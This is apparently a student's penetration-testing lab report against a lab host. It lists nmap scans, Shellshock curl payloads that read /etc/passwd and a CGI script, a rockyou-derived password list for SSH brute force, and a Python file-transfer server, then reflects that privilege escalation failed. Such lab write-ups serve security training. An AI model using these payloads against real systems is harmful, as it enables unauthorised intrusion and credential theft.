To get versions of running services on the target: 
sudo nmap -sV -p 22,80 10.0.5.23

Parsing nmap result with nmaptocsv:
sudo nmap -sT -sV --top-ports-100 10.0.5.23 -Pn -oG top100.txt
nmaptocsv -i top100.txt -d ","

Techniques you used to invoke remote code execution:
curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://10.0.5.23/cgi-bin/status
curl -H 'User-Agent: () { :; }; /bin/ipconfig' http://10.0.5.23/cgi-bin/status\n
curl -H 'User-Agent: () { :;}; echo; /bin/cat /var/www/cgi-bin/status.cgi' bash -s:'' http://10.0.5.23/cgi-bin/status

The generation of a list of passwords and subsequent ssh bruteforce:
zgrep -i 'samwise' /usr/share/wordlists/rockyou.txt.gz | sort -u > passwords.txt

Transfer of files using python and wget or any other mechanism you chose:
python3 -m http.server 8080

Compiling and running a privilege escalation exploit: 
Going to have to come back to this one. 

Reflection:
This exercise provided valuable hands-on experience in penetration testing, but I was unable to achieve root privileges due to challenges with privilege escalation. I successfully exploited Shellshock for remote code execution and used Hydra to brute-force SSH access. I was unable to escalate privileges using Dirty COW. The exploit compiled but did not grant root access.
